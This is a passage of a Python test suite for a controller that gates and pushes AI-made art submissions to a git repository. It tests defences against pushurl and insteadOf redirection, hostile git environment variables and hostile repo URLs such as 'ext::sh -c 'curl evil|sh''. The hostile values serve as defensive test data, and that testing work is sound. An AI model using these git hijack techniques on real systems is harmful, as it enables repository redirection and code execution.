        self.assertEqual([], self.enqueued)


class ForgedFinalistTests(WorkerEnv):
    """Same id, different content, must not pass (#2)."""

    def setUp(self):
        super().setUp()
        self.cfg = worker_cfg(evolve_worker={
            "repo": str(self.origin), "git_author_name": "test",
            "git_author_email": "t@example.com",
            "fanout": {"enabled": True, "children": 3}})
        self.results = [child_result("a"), child_result("b"),
                        child_result("adversarial-verifier", wave=2)]

    def run_with(self, forge):
        with mock.patch.object(EW.SS, "run_children", return_value=self.results), \
             mock.patch.object(EW, "run_model",
                               FanoutIntegrationTests.maker_using_finalists(
                                   self, forge=forge)):
            return EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

    def test_a_rewritten_premise_under_the_same_id_is_rejected(self):
        summary = self.run_with({"premise": "something else entirely"})
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("content was rewritten", summary["detail"])
        self.assertFalse(self.gh.calls, "nothing reaches GitHub")

    def test_a_rewritten_score_is_rejected(self):
        summary = self.run_with({"scores": {d: 10 for d in EW.SCORE_DIMENSIONS}})
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("content was rewritten", summary["detail"])

    def test_rewritten_role_provenance_is_rejected(self):
        summary = self.run_with({"from": "someone-more-impressive"})
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])

    def test_a_rewritten_evidence_digest_is_rejected(self):
        summary = self.run_with({"evidence_digest": "0" * 64})
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])

    def test_dropping_a_record_field_is_rejected(self):
        def maker(staging, prompt, wcfg, depth=0, runtime=None):
            staging = Path(staging)
            records = json.loads((staging / "round1.json").read_text())
            stripped = [{"id": r["id"], "premise": r["premise"],
                         "scores": r["scores"]} for r in records]
            write_submission(staging / "out", "new-piece",
                             meta_for("new-piece", round1_records=stripped))
            (staging / "state-out.json").write_text(json.dumps(
                {"cycle": 1, "last_slug": "new-piece", "notes": "n"}),
                encoding="utf-8")
            return "ok", "SENTINEL_RESULT: CONTRIBUTED\n"
        with mock.patch.object(EW.SS, "run_children", return_value=self.results), \
             mock.patch.object(EW, "run_model", maker):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("must carry the finalist record", summary["detail"])

    def test_a_published_digest_that_lies_about_its_own_fields_is_rejected(self):
        summary = self.run_with({"digest": "f" * 64})
        self.assertEqual(EW.OUTCOME_REJECTED, summary["outcome"])
        self.assertIn("publishes a digest", summary["detail"])


class CloneScopeTests(WorkerEnv):
    """The controller's own clone: what it copies in, and what it pushes."""

    def setUp(self):
        super().setUp()
        self.clone = self.home / "clone"
        subprocess.run(["git", "clone", str(self.origin), str(self.clone)],
                       check=True, capture_output=True)
        self.wcfg = EW.worker_config({"evolve_worker": {"repo": str(self.origin)}})
        self.wcfg["repo"] = str(self.origin)
        staging_out = self.home / "stage" / "out"
        staging_out.mkdir(parents=True)
        write_submission(staging_out, "new-piece", meta_for("new-piece"))
        self.submission = EW.gate_directory(staging_out, self.wcfg, 1, None,
                                            None, {"already-here"})

    def test_the_controller_copies_only_the_validated_bytes(self):
        EW.install_into_clone(self.clone, self.submission)
        paths = EW.verify_clone_scope(self.clone, self.submission, self.wcfg)
        self.assertEqual(["submissions/new-piece/meta.json",
                          "submissions/new-piece/piece.svg"], paths)
        mode = (self.clone / "submissions" / "new-piece" / "piece.svg").stat().st_mode
        self.assertEqual(0o644, mode & 0o777, "copies are never executable")

    def test_an_extra_file_appearing_in_the_clone_is_caught(self):
        EW.install_into_clone(self.clone, self.submission)
        (self.clone / "submissions" / "new-piece" / "sneaky.txt").write_text(
            "x", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            EW.verify_clone_scope(self.clone, self.submission, self.wcfg)
        self.assertIn("expected", str(cm.exception))

    def test_an_edited_existing_file_in_the_clone_is_caught(self):
        EW.install_into_clone(self.clone, self.submission)
        (self.clone / "submissions" / "index.json").write_text("[]", encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            EW.verify_clone_scope(self.clone, self.submission, self.wcfg)
        self.assertIn("existing path", str(cm.exception))

    def test_a_moved_head_in_the_clone_is_caught(self):
        base = git(self.clone, "rev-parse", "HEAD").strip()
        EW.install_into_clone(self.clone, self.submission)
        git(self.clone, "config", "user.email", "t@example.com")
        git(self.clone, "config", "user.name", "t")
        git(self.clone, "add", "-A")
        git(self.clone, "commit", "-m", "not the controller")
        with self.assertRaises(EW.GateError) as cm:
            EW.verify_clone_scope(self.clone, self.submission, self.wcfg, base)
        self.assertIn("moved its HEAD", str(cm.exception))

    def test_installing_over_an_existing_slug_is_refused(self):
        EW.install_into_clone(self.clone, self.submission)
        with self.assertRaises(EW.GateError):
            EW.install_into_clone(self.clone, self.submission)

    # ── the push-redirect repro ──
    def test_a_pushurl_is_rejected_before_anything_is_pushed(self):
        attacker = self.home / "attacker.git"
        subprocess.run(["git", "init", "--bare", "-b", "main", str(attacker)],
                       check=True, capture_output=True)
        git(self.clone, "config", "remote.origin.pushurl", str(attacker))

        with self.assertRaises(EW.GateError) as cm:
            EW.assert_repo_integrity(self.clone, self.wcfg)
        self.assertIn("pushurl", str(cm.exception))
        self.assertIn(str(self.origin), str(cm.exception))

        refs = git_bare(attacker, "for-each-ref", "--format=%(refname)")
        self.assertEqual("", refs.strip(), "nothing reached the attacker remote")

    def test_a_wandering_fetch_url_is_reset_to_canonical(self):
        git(self.clone, "remote", "set-url", "origin",
            "https://example.invalid/somewhere-else.git")
        self.assertEqual(str(self.origin),
                         EW.assert_repo_integrity(self.clone, self.wcfg))
        self.assertEqual(str(self.origin),
                         git(self.clone, "remote", "get-url", "origin").strip())
        self.assertEqual(str(self.origin),
                         git(self.clone, "remote", "get-url", "--push",
                             "origin").strip())

    def test_a_forged_staging_file_cannot_redirect_a_push(self):
        """The repro from the finding, end to end.

        A maker that writes something shaped like git configuration into its
        staging area cannot affect the push at all: the file is rejected by
        the gate, and even if it somehow reached the clone, the integrity
        check resets the remote before the push.
        """
        staging = self.home / "stage2"
        EW.prepare_staging(staging)
        out = staging / "out"
        write_submission(out, "second-piece", meta_for("second-piece"))
        forged = out / EW.SUBMISSION_DIR / ".git"
        forged.mkdir()
        (forged / "config").write_text(
            "[remote \"origin\"]\n\tpushurl = https://attacker.example/x.git\n",
            encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            EW.assert_no_git(staging)
        self.assertIn(".git", str(cm.exception))

        # and the second lock: a clone whose config was tampered with never
        # gets to the push at all
        git(self.clone, "config", "remote.origin.pushurl",
            "https://attacker.example/x.git")
        with self.assertRaises(EW.GateError) as cm2:
            EW.assert_repo_integrity(self.clone, self.wcfg)
        self.assertIn("pushurl", str(cm2.exception))

    def test_unexpected_local_config_is_rejected(self):
        for key, value in (("core.hooksPath", "/tmp/hooks"),
                           ("core.sshCommand", "ssh -o x=y"),
                           ("url.https://attacker.example/.insteadOf",
                            "https://github.com/"),
                           ("credential.helper", "!evil")):
            with self.subTest(key=key):
                git(self.clone, "config", key, value)
                with self.assertRaises(EW.GateError) as cm:
                    EW.assert_repo_integrity(self.clone, self.wcfg)
                self.assertIn(key.split(".")[0], str(cm.exception).lower())
                subprocess.run(["git", "config", "--unset-all", key],
                               cwd=str(self.clone), capture_output=True)

    def test_an_alternates_file_is_rejected(self):
        alt = self.clone / ".git" / "objects" / "info"
        alt.mkdir(parents=True, exist_ok=True)
        (alt / "alternates").write_text("/somewhere/else/objects\n",
                                        encoding="utf-8")
        with self.assertRaises(EW.GateError) as cm:
            EW.assert_repo_integrity(self.clone, self.wcfg)
        self.assertIn("alternates", str(cm.exception))

    def test_an_executable_hook_is_rejected(self):
        hooks = self.clone / ".git" / "hooks"
        hooks.mkdir(exist_ok=True)
        hook = hooks / "pre-push"
        hook.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
        hook.chmod(0o755)
        with self.assertRaises(EW.GateError) as cm:
            EW.assert_repo_integrity(self.clone, self.wcfg)
        self.assertIn("hooks", str(cm.exception))

    def test_a_clean_clone_passes_and_returns_the_canonical_url(self):
        self.assertEqual(str(self.origin),
                         EW.assert_repo_integrity(self.clone, self.wcfg))

    # ── the index, verified before the push ──
    def test_the_staged_index_is_verified_against_the_gated_bytes(self):
        EW.install_into_clone(self.clone, self.submission)
        git(self.clone, "add", "--", "submissions/new-piece")
        paths = sorted([self.submission["meta_path"], self.submission["piece_path"]])
        EW.verify_staged_tree(self.clone, self.submission, self.wcfg, paths)

        proc = subprocess.run(["git", "hash-object", "-w", "--stdin"],
                              cwd=str(self.clone), input=b"forged bytes",
                              capture_output=True)
        blob = proc.stdout.decode().strip()
        subprocess.run(["git", "update-index", "--cacheinfo",
                        f"100644,{blob},submissions/new-piece/piece.svg"],
                       cwd=str(self.clone), check=True, capture_output=True)
        with self.assertRaises(EW.GateError) as cm:
            EW.verify_staged_tree(self.clone, self.submission, self.wcfg, paths)
        self.assertIn("not the file that passed the gate", str(cm.exception))

    def test_a_symlink_mode_in_the_index_is_rejected(self):
        EW.install_into_clone(self.clone, self.submission)
        git(self.clone, "add", "--", "submissions/new-piece")
        paths = sorted([self.submission["meta_path"], self.submission["piece_path"]])
        proc = subprocess.run(["git", "hash-object", "-w", "--stdin"],
                              cwd=str(self.clone), input=b"/etc/passwd",
                              capture_output=True)
        blob = proc.stdout.decode().strip()
        subprocess.run(["git", "update-index", "--cacheinfo",
                        f"120000,{blob},submissions/new-piece/piece.svg"],
                       cwd=str(self.clone), check=True, capture_output=True)
        with self.assertRaises(EW.GateError) as cm:
            EW.verify_staged_tree(self.clone, self.submission, self.wcfg, paths)
        self.assertIn("120000", str(cm.exception))


class CleanupIntegrityTests(WorkerEnv):
    """Cleanup is exactly when the repository is least trustworthy."""

    def setUp(self):
        super().setUp()
        self.attacker = self.home / "attacker.git"
        subprocess.run(["git", "init", "--bare", "-b", "main",
                        str(self.attacker)], check=True, capture_output=True)

    def attacker_refs(self):
        return git_bare(self.attacker, "for-each-ref",
                        "--format=%(refname)").split()

    def origin_branches(self):
        return [r for r in git_bare(self.origin, "for-each-ref",
                                    "--format=%(refname)").split()
                if r != "refs/heads/main"]

    def gh_that_fails_pr_create_after_injecting_a_pushurl(self, clone_holder):
        """The repro: the push succeeds, then a pushurl appears, then PR
        creation fails and the cleanup path runs."""
        def fake(*args, timeout=None):
            self.gh.calls.append(args)
            if args[:2] == ("pr", "create"):
                clone = clone_holder.get("clone")
                git(clone, "config", "remote.origin.pushurl", str(self.attacker))
                raise EW.CommandError("gh pr create exited 1: rate limited")
            raise AssertionError(f"unexpected gh call: {args}")
        return fake

    def test_cleanup_never_pushes_to_an_injected_remote(self):
        holder = {}
        real_publish = EW.publish

        def capture(clone, *a, **kw):
            holder["clone"] = clone
            return real_publish(clone, *a, **kw)

        with mock.patch.object(EW, "publish", capture), \
             mock.patch.object(EW, "_gh",
                               self.gh_that_fails_pr_create_after_injecting_a_pushurl(holder)), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())

        self.assertEqual(EW.OUTCOME_FAILED, summary["outcome"], summary)
        self.assertEqual([], self.attacker_refs(),
                         "the cleanup pushed to the attacker's remote")
        self.assertEqual([], self.origin_branches(),
                         "the real branch was left orphaned on origin")

    def test_a_tampered_clone_still_cleans_the_real_origin(self):
        # The unit of the same guarantee: a clone whose config was rewritten
        # cannot be used, and the branch is still removed from the real repo.
        clone = self.home / "clone"
        subprocess.run(["git", "clone", str(self.origin), str(clone)],
                       check=True, capture_output=True)
        git(clone, "config", "user.email", "t@example.com")
        git(clone, "config", "user.name", "t")
        git(clone, "checkout", "-q", "-b", "art/doomed")
        (clone / "x.txt").write_text("x", encoding="utf-8")
        git(clone, "add", "-A")
        git(clone, "commit", "-qm", "doomed")
        git(clone, "push", "-q", "-u", "origin", "art/doomed")
        self.assertEqual(["refs/heads/art/doomed"], self.origin_branches())

        git(clone, "config", "remote.origin.pushurl", str(self.attacker))
        wcfg = dict(EW.worker_config({}), repo=str(self.origin))
        self.assertTrue(EW._delete_remote_branch(clone, "art/doomed", wcfg))

        self.assertEqual([], self.origin_branches(),
                         "the real branch should have been deleted")
        self.assertEqual([], self.attacker_refs(),
                         "nothing may reach the injected remote")

    def test_an_unreachable_canonical_repo_fails_closed(self):
        clone = self.home / "clone2"
        subprocess.run(["git", "clone", str(self.origin), str(clone)],
                       check=True, capture_output=True)
        git(clone, "config", "remote.origin.pushurl", str(self.attacker))
        wcfg = dict(EW.worker_config({}),
                    repo=str(self.home / "does-not-exist.git"))
        self.assertFalse(EW._delete_remote_branch(clone, "art/nope", wcfg))
        self.assertEqual([], self.attacker_refs())

    def test_the_network_chokepoint_refuses_a_tampered_clone(self):
        clone = self.home / "clone3"
        subprocess.run(["git", "clone", str(self.origin), str(clone)],
                       check=True, capture_output=True)
        git(clone, "config", "remote.origin.pushurl", str(self.attacker))
        wcfg = dict(EW.worker_config({}), repo=str(self.origin))
        with self.assertRaises(EW.GateError):
            EW._git_remote(clone, wcfg, "fetch", "--no-tags", "origin", "main")

    def test_the_chokepoint_rejects_local_verbs(self):
        clone = self.home / "clone4"
        subprocess.run(["git", "clone", str(self.origin), str(clone)],
                       check=True, capture_output=True)
        wcfg = dict(EW.worker_config({}), repo=str(self.origin))
        with self.assertRaises(EW.CommandError):
            EW._git_remote(clone, wcfg, "status", "--porcelain")

    def test_no_unaudited_network_git_call_survives_in_the_source(self):
        """The invariant, asserted against the code rather than remembered.

        Every git verb that can reach the network must go through
        `_git_remote()` (which verifies repo integrity first) — or sit on a
        line explicitly marked `sanctioned-network-git`, with a reason. The
        count of sanctioned exceptions is pinned so a new one cannot arrive
        quietly.
        """
        source = (Path(__file__).resolve().parent / "evolve_worker.py").read_text(
            encoding="utf-8")
        lines = source.splitlines()
        verbs = ("fetch", "push", "pull", "ls-remote", "clone", "submodule",
                 "archive")
        offenders, sanctioned = [], 0
        for n, line in enumerate(lines):
            match = re.search(r'_git\((?!_)[^)]*?"(' + "|".join(verbs) + r')"', line)
            if not match:
                continue
            window = "\n".join(lines[max(0, n - 6):n + 1])
            if "sanctioned-network-git" in window:
                sanctioned += 1
            else:
                offenders.append(f"{n + 1}: {line.strip()[:90]}")
        self.assertEqual([], offenders,
                         "network git must go through _git_remote(), or carry "
                         "a sanctioned-network-git justification")
        self.assertEqual(2, sanctioned,
                         "the sanctioned exceptions are the two calls in the "
                         "sanitized cleanup repo; a new one needs review")

    def test_the_controller_never_shells_out_to_git_clone(self):
        source = (Path(__file__).resolve().parent / "evolve_worker.py").read_text(
            encoding="utf-8")
        body = source.split("def _clone_repo", 1)[1].split("\ndef ", 1)[0]
        self.assertNotIn('"clone"', body,
                         "the clone is built by init + fetch, never by "
                         "`git clone`, which reads global config before it "
                         "resolves the url")

    def test_every_raw_git_subprocess_lives_in_an_isolated_helper(self):
        """Only these functions may hand a git/gh command to the OS, and they
        are the ones that pin the binary and set the sanitized environment."""
        import ast
        path = Path(__file__).resolve().parent / "evolve_worker.py"
        tree = ast.parse(path.read_text(encoding="utf-8"))
        allowed = {"_git", "_git_bytes", "_credential_helper", "_gh"}
        found = {}

        def argv0_is_a_binary(call):
            if not (isinstance(call.func, ast.Attribute)
                    and call.func.attr == "run"
                    and getattr(call.func.value, "id", "") == "subprocess"
                    and call.args and isinstance(call.args[0], ast.List)
                    and call.args[0].elts):
                return False
            first = call.args[0].elts[0]
            if isinstance(first, ast.Constant) and first.value in ("git", "gh"):
                return True
            return (isinstance(first, ast.Call)
                    and getattr(first.func, "id", "") in ("git_binary",
                                                          "gh_binary"))

        for node in ast.walk(tree):
            if not isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                continue
            for inner in ast.walk(node):
                if isinstance(inner, ast.Call) and argv0_is_a_binary(inner):
                    found[node.name] = found.get(node.name, 0) + 1
        self.assertEqual(allowed, set(found),
                         f"git/gh subprocess calls appeared outside the pinned "
                         f"helpers: {sorted(set(found) - allowed)}")


class CloneIsolationTests(WorkerEnv):
    """The clone itself is a controller-owned, config-isolated operation."""

    def setUp(self):
        super().setUp()
        # A second repo with a DIFFERENT marker file, standing in for the
        # attacker's. If a rewrite ever wins, the marker says so instantly.
        self.attacker = self.home / "attacker.git"
        seed = self.home / "attacker-seed"
        seed.mkdir()
        git(seed, "init", "-q", "-b", "main")
        git(seed, "config", "user.email", "a@example.com")
        git(seed, "config", "user.name", "a")
        (seed / "MARKER").write_text("ATTACKER", encoding="utf-8")
        write_submission(seed, "attacker-piece", meta_for("attacker-piece"))
        git(seed, "add", "-A")
        git(seed, "commit", "-qm", "attacker seed")
        git(self.home, "init", "--bare", "-q", "-b", "main", str(self.attacker))
        git(seed, "remote", "add", "origin", str(self.attacker))
        git(seed, "push", "-q", "origin", "main")

        # …and a marker on the canonical side, so "we got the right one" is
        # a positive assertion rather than the absence of a bad one.
        canonical_seed = self.home / "canonical-seed"
        subprocess.run(["git", "clone", "-q", str(self.origin),
                        str(canonical_seed)], check=True, capture_output=True)
        git(canonical_seed, "config", "user.email", "t@example.com")
        git(canonical_seed, "config", "user.name", "t")
        (canonical_seed / "MARKER").write_text("CANONICAL", encoding="utf-8")
        git(canonical_seed, "add", "-A")
        git(canonical_seed, "commit", "-qm", "canonical marker")
        git(canonical_seed, "push", "-q", "origin", "main")
        self.canonical_head = git_bare(self.origin, "rev-parse", "main").strip()

        self.gitconfig = self.home / "hostile.gitconfig"
        self.gitconfig.write_text(
            f'[url "{self.attacker}"]\n\tinsteadOf = {self.origin}\n',
            encoding="utf-8")
        self.wcfg = dict(EW.worker_config({}), repo=str(self.origin))

    def test_a_global_insteadof_rewrite_cannot_redirect_the_clone(self):
        clone = self.home / "clone"
        # Prove the hostile config WOULD win against a naive clone…
        naive = subprocess.run(
            ["git", "clone", "-q", str(self.origin), str(self.home / "naive")],
            capture_output=True, text=True,
            env={**os.environ, "GIT_CONFIG_GLOBAL": str(self.gitconfig)})
        self.assertEqual(0, naive.returncode, naive.stderr[:300])
        self.assertEqual("ATTACKER",
                         (self.home / "naive" / "MARKER").read_text().strip(),
                         "the repro itself is broken if this is not the "
                         "attacker's content")

        # …and that the controller's clone is immune to it.
        with mock.patch.dict(os.environ,
                             {"GIT_CONFIG_GLOBAL": str(self.gitconfig)}), \
             mock.patch.object(EW, "_GIT_ENV", None):
            head = EW._clone_repo(self.wcfg, clone)

        self.assertEqual("CANONICAL", (clone / "MARKER").read_text().strip(),
                         "the controller cloned the attacker's repository")
        self.assertEqual(self.canonical_head, head)
        self.assertFalse((clone / "submissions" / "attacker-piece").exists())
        self.assertEqual(str(self.origin),
                         git(clone, "remote", "get-url", "origin").strip())

    def test_config_injected_through_the_environment_is_stripped(self):
        clone = self.home / "clone-env"
        hostile = {
            "GIT_CONFIG_COUNT": "1",
            "GIT_CONFIG_KEY_0": f"url.{self.attacker}.insteadOf",
            "GIT_CONFIG_VALUE_0": str(self.origin),
        }
        with mock.patch.dict(os.environ, hostile), \
             mock.patch.object(EW, "_GIT_ENV", None):
            EW._clone_repo(self.wcfg, clone)
        self.assertEqual("CANONICAL", (clone / "MARKER").read_text().strip())

    def test_the_sanitized_environment_has_no_rewrites_or_proxies(self):
        with mock.patch.dict(os.environ, {"https_proxy": "http://evil:8080",
                                          "GIT_SSH_COMMAND": "ssh -o x=y",
                                          "GIT_CONFIG_PARAMETERS": "'a.b=c'"}), \
             mock.patch.object(EW, "_GIT_ENV", None):
            env = EW.controller_git_env()
        for leaked in ("https_proxy", "GIT_SSH_COMMAND", "GIT_CONFIG_PARAMETERS",
                       "GIT_CONFIG_COUNT", "GIT_PROXY_COMMAND"):
            self.assertNotIn(leaked, env)
        self.assertEqual(os.devnull, env["GIT_CONFIG_SYSTEM"])
        self.assertEqual("1", env["GIT_CONFIG_NOSYSTEM"])
        self.assertEqual("0", env["GIT_TERMINAL_PROMPT"])
        self.assertEqual("https:file", env["GIT_ALLOW_PROTOCOL"])
        config = Path(env["GIT_CONFIG_GLOBAL"]).read_text(encoding="utf-8")
        directives = [line for line in config.splitlines()
                      if line.strip() and not line.lstrip().startswith("#")]
        self.assertTrue(all(d.startswith(("[credential]", "\thelper"))
                            for d in directives),
                        f"the sanitized config holds more than a helper: "
                        f"{directives}")

    def test_a_shell_credential_helper_is_never_carried_over(self):
        with mock.patch.object(EW.subprocess, "run",
                               return_value=subprocess.CompletedProcess(
                                   [], 0, stdout="!evil --steal\n", stderr="")):
            self.assertEqual("", EW._credential_helper())

    def test_a_plain_credential_helper_is_carried_over(self):
        with mock.patch.object(EW.subprocess, "run",
                               return_value=subprocess.CompletedProcess(
                                   [], 0, stdout="osxkeychain\n", stderr="")):
            self.assertEqual("osxkeychain", EW._credential_helper())

    # ── url shapes ──
    def test_hostile_repo_urls_are_refused_before_git_sees_them(self):
        for repo in ("ext::sh -c 'curl evil|sh'",
                     "--upload-pack=/bin/sh",
                     "https://user:token@github.com/kody-w/x",
                     "https://evil.example/kody-w/x",
                     "git://github.com/kody-w/x",
                     "http://github.com/kody-w/x",
                     "ssh://git@github.com/kody-w/x",
                     "https://github.com/too/many/parts",
                     "../evil",
                     "-u./payload"):
            with self.subTest(repo=repo):
                with self.assertRaises(EW.GateError):
                    EW.validate_repo_url(repo, self.wcfg)

    def test_the_canonical_shapes_are_accepted(self):
        self.assertEqual("https://github.com/kody-w/public-art-collective.git",
                         EW.validate_repo_url("kody-w/public-art-collective",
                                              self.wcfg))
        self.assertEqual(str(self.origin),
                         EW.validate_repo_url(str(self.origin), self.wcfg),
                         "explicit local paths stay allowed for temp repos")

    def test_a_missing_local_repo_is_refused(self):
        with self.assertRaises(EW.GateError):
            EW.validate_repo_url(str(self.home / "nope.git"), self.wcfg)

    def test_an_extra_allowed_host_can_be_configured(self):
        wcfg = dict(self.wcfg, allowed_repo_hosts=["github.example.com"])
        self.assertEqual("https://github.example.com/a/b",
                         EW.validate_repo_url("https://github.example.com/a/b",
                                              wcfg))
        with self.assertRaises(EW.GateError):
            EW.validate_repo_url("https://github.com/a/b", wcfg)


HOSTILE_GIT_ENV_VARS = (
    # execution paths — the finding: GIT_EXEC_PATH decides where
    # git-remote-https and git-upload-pack come from
    "GIT_EXEC_PATH", "GIT_TEMPLATE_DIR", "GIT_SSH", "GIT_SSH_COMMAND",
    "GIT_PROXY_COMMAND", "GIT_EXTERNAL_DIFF", "GIT_ASKPASS", "GIT_EDITOR",
    "GIT_PAGER", "GIT_SEQUENCE_EDITOR",
    # dynamic linker injection
    "LD_PRELOAD", "LD_LIBRARY_PATH", "DYLD_INSERT_LIBRARIES",
    "DYLD_LIBRARY_PATH", "DYLD_FRAMEWORK_PATH",
    # config injection
    "GIT_CONFIG_PARAMETERS", "GIT_CONFIG_COUNT", "GIT_CONFIG_KEY_0",
    "GIT_CONFIG_VALUE_0", "GIT_CONFIG", "GIT_ATTR_NOSYSTEM",
    # repository redirection
    "GIT_DIR", "GIT_WORK_TREE", "GIT_INDEX_FILE", "GIT_NAMESPACE",
    "GIT_OBJECT_DIRECTORY", "GIT_ALTERNATE_OBJECT_DIRECTORIES",
    "GIT_CEILING_DIRECTORIES",
    # transport and proxying
    "GIT_ALLOW_PROTOCOL", "GIT_PROTOCOL_FROM_USER", "GIT_SMART_HTTP",
    "http_proxy", "https_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY",
    "all_proxy", "NO_PROXY",
    # prompting and tracing
    "GIT_TERMINAL_PROMPT", "GIT_TRACE", "GIT_TRACE2", "GIT_CURL_VERBOSE",
    # identity and location
    "XDG_CONFIG_HOME", "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
)


class HostileEnvironmentTests(WorkerEnv):
    """Nothing ambient reaches git unless the controller put it there (#1).

    The vector this closes was reproduced first: a fake `git-upload-pack` on
    GIT_EXEC_PATH executes during a plain local clone, before any config is
    read and long before repo integrity is checked. A denylist that misses one
    variable misses the transport itself, so the environment is an allowlist.
    """

    def setUp(self):
        super().setUp()
        self.wcfg = dict(EW.worker_config({}), repo=str(self.origin))
        self.marker = self.home / "PWNED"
        self.exec_path = self.home / "hostile-exec"
        self.exec_path.mkdir()
        hijack = self.exec_path / "git-upload-pack"
        hijack.write_text(
            f'#!/bin/sh\ntouch "{self.marker}"\n'
            f'exec /usr/bin/git-upload-pack "$@"\n', encoding="utf-8")
        hijack.chmod(0o755)
        self.hostile = {v: self.hostile_value(v) for v in HOSTILE_GIT_ENV_VARS}

    def hostile_value(self, name):
        if name == "GIT_EXEC_PATH":
            return str(self.exec_path)
        if name in ("GIT_CONFIG_COUNT",):
            return "1"
        if name == "GIT_CONFIG_KEY_0":
            return "url.https://attacker.example/.insteadOf"
        if name == "GIT_CONFIG_VALUE_0":
            return "https://github.com/"
        if name == "GIT_TERMINAL_PROMPT":
            return "1"
        if name == "GIT_ALLOW_PROTOCOL":
            return "ext"
        if name in ("LD_PRELOAD", "DYLD_INSERT_LIBRARIES"):
            return "/tmp/evil.dylib"
        return f"/hostile/{name.lower()}"

    def fresh_env(self):
        with mock.patch.object(EW, "_GIT_ENV", None):
            return EW.controller_git_env()

    # ── the allowlist itself ──
    def test_no_hostile_variable_survives_unless_the_controller_set_it(self):
        controller_set = {"GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
                          "GIT_CONFIG_NOSYSTEM", "GIT_TERMINAL_PROMPT",
                          "GIT_ASKPASS", "GIT_ALLOW_PROTOCOL",
                          "GIT_PROTOCOL_FROM_USER", "XDG_CONFIG_HOME"}
        with mock.patch.dict(os.environ, self.hostile):
            env = self.fresh_env()
        for name in HOSTILE_GIT_ENV_VARS:
            with self.subTest(var=name):
                if name in controller_set:
                    self.assertNotEqual(self.hostile[name], env.get(name),
                                        f"{name} kept its hostile value")
                else:
                    self.assertNotIn(name, env, f"{name} survived the allowlist")

    def test_the_environment_is_exactly_what_the_controller_decided(self):
        with mock.patch.dict(os.environ, self.hostile):
            env = self.fresh_env()
        expected = {"PATH", "HOME", "XDG_CONFIG_HOME", "TMPDIR",
                    "GIT_CONFIG_GLOBAL", "GIT_CONFIG_SYSTEM",
                    "GIT_CONFIG_NOSYSTEM", "GIT_TERMINAL_PROMPT",
                    "GIT_ASKPASS", "GIT_ALLOW_PROTOCOL",
                    "GIT_PROTOCOL_FROM_USER"}
        self.assertEqual(set(), set(env) - expected - set(EW.GIT_ENV_ALLOWLIST)
                         - set(EW.GIT_ENV_CERT_VARS))
        self.assertEqual("0", env["GIT_TERMINAL_PROMPT"])
        self.assertEqual("https:file", env["GIT_ALLOW_PROTOCOL"])
        self.assertEqual("/usr/bin/false", env["GIT_ASKPASS"])
        self.assertTrue(env["HOME"].endswith("git-home"))
        self.assertTrue(env["TMPDIR"].startswith(env["HOME"]))

    def test_a_relative_path_entry_is_dropped(self):
        with mock.patch.dict(os.environ, {"PATH": ".:relative:/usr/bin:/bin"}):
            env = self.fresh_env()
        self.assertNotIn(".", env["PATH"].split(os.pathsep))
        self.assertNotIn("relative", env["PATH"].split(os.pathsep))
        self.assertIn("/usr/bin", env["PATH"].split(os.pathsep))

    def test_an_unusable_path_still_finds_git(self):
        with mock.patch.dict(os.environ, {"PATH": "/nonexistent-xyz"}):
            env = self.fresh_env()
        self.assertTrue(any(os.path.exists(os.path.join(d, "git"))
                            for d in env["PATH"].split(os.pathsep)),
                        "git must remain findable")

    def test_cert_vars_are_carried_only_when_they_exist(self):
        real = self.home / "certs.pem"
        real.write_text("x", encoding="utf-8")
        with mock.patch.dict(os.environ, {"SSL_CERT_FILE": str(real)}):
            self.assertEqual(str(real), self.fresh_env()["SSL_CERT_FILE"])
        with mock.patch.dict(os.environ,
                             {"SSL_CERT_FILE": "/nope/does-not-exist.pem"}):
            self.assertNotIn("SSL_CERT_FILE", self.fresh_env())

    # ── the vector, end to end ──
    def test_the_hijack_vector_reproduces_without_the_controller(self):
        """If this ever stops firing, the test below proves nothing."""
        naive = self.home / "naive"
        proc = subprocess.run(
            ["git", "clone", "-q", str(self.origin), str(naive)],
            capture_output=True, text=True,
            env={**os.environ, "GIT_EXEC_PATH": str(self.exec_path)})
        self.assertEqual(0, proc.returncode, proc.stderr[:300])
        self.assertTrue(self.marker.exists(),
                        "GIT_EXEC_PATH no longer hijacks git-upload-pack; "
                        "the guarantee below needs a new repro")

    def test_the_initial_fetch_is_immune_to_a_hijacked_exec_path(self):
        clone = self.home / "clone"
        with mock.patch.dict(os.environ, self.hostile), \
             mock.patch.object(EW, "_GIT_ENV", None):
            head = EW._clone_repo(self.wcfg, clone)
        self.assertFalse(self.marker.exists(),
                         "a hostile GIT_EXEC_PATH executed during the fetch")
        self.assertEqual(git_bare(self.origin, "rev-parse", "main").strip(), head)
        self.assertTrue((clone / "submissions" / "already-here").is_dir(),
                        "canonical transport must still work")

    def test_the_sanitized_cleanup_is_immune_too(self):
        clone = self.home / "clone-cleanup"
        with mock.patch.object(EW, "_GIT_ENV", None):
            EW._clone_repo(self.wcfg, clone)
        git(clone, "config", "user.email", "t@example.com")
        git(clone, "config", "user.name", "t")
        git(clone, "checkout", "-q", "-b", "art/doomed")
        (clone / "x.txt").write_text("x", encoding="utf-8")
        git(clone, "add", "-A")
        git(clone, "commit", "-qm", "doomed")
        git(clone, "push", "-q", "-u", "origin", "art/doomed")
        # force the sanitized path: the clone no longer verifies
        git(clone, "config", "remote.origin.pushurl", str(self.home / "x.git"))

        with mock.patch.dict(os.environ, self.hostile), \
             mock.patch.object(EW, "_GIT_ENV", None):
            self.assertTrue(EW._delete_remote_branch(clone, "art/doomed",
                                                     self.wcfg))
        self.assertFalse(self.marker.exists(),
